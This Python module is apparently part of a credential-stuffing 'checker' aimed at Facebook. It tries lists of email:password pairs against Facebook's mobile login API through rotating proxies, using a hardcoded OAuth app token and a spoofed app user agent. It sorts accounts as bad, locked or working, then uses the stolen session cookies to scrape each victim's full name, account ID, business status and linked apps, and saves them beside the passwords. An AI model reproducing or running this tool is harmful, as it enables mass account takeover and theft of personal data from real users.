from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry
from urllib import parse

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {'email': email, 'password': password, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'device_id': 'cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1'}
                headers = {
                    "content-type":"application/x-www-form-urlencoded",
                    "authority": "b-api.facebook.com" ,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "cache-control": "max-age=0" ,
                    "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16" ,
                    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 7 MIUI/V11.0.6.0.PFLMIXM) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]" ,
                }
                r = s.post('https://b-api.facebook.com/method/auth.login',data=payload,headers=headers)
                if any(key in r.text for key in ['Invalid username or password',"\":\"Invalid username or email address " ]):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                if any(key in r.text for key in ["User must verify","To help keep your account safe, we temporarily locked it.","You can't log in right now\\"]):
                    if not Checker.cui: log("custom",":".join([email,password]),"Facebook")
                    save("Facebook","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                if not 'session_key' in r.text:
                    raise

                cus = r.text.split("c_user\",\"value\":\"")[1].split("\"")[0]
                fr = r.text.split("fr\",\"value\":\"")[1].split("\"")[0]
                datr = r.text.split("datr\",\"value\":\"")[1].split("\"")[0]
                xs = parse.quote(r.text.split("xs\",\"value\":\"")[1].split("\"")[0])

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" ,
                    "Accept": "text/html" ,
                    "Accept-Language": "en-US,en;q=0.5" ,
                    "Referer": "https://m.facebook.com/login/save-device/?login_source=login" ,
                    "Connection": "keep-alive" ,
                    "Cookie": f"datr={datr}; fr={fr}; sb=3lMpYKwYO6_QcWBti1wPKbjK; m_pixel_ratio=1; wd=1284x422; c_user={cus}; xs={xs}" ,
                    "Upgrade-Insecure-Requests": "1" ,
                    "TE": "Trailers" ,
                }
                r = s.get('https://m.facebook.com/?refsrc=https%3A%2F%2Fm.facebook.com%2F&_rdr',headers=headers)

                full_name = r.text.split("\",\"NAME\":\"")[1].split("\"")[0]
                business = r.text.split(",\"IS_BUSINESS_PERSON_ACCOUNT\":")[1].split(",")[0]
                acc_id = r.text.split("\"ACCOUNT_ID\":\"")[1].split("\"")[0]

                r = s.get('https://www.facebook.com/settings?tab=applications&ref=settings',headers=headers)
                
                linked_apps = r.text.split("\",\"app_name\":\"")[1].split("\",\"")[0]
                
                if not Checker.cui: log("good",':'.join([email,password]),"Facebook")
                save("Facebook","good",Checker.time,':'.join([email,password])+f" | Full Name: {full_name} | Business Account: {business} | Account ID: {acc_id} | Linked Apps: {linked_apps}")
                Checker.good += 1
                return_proxy(proxy)
                return

        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1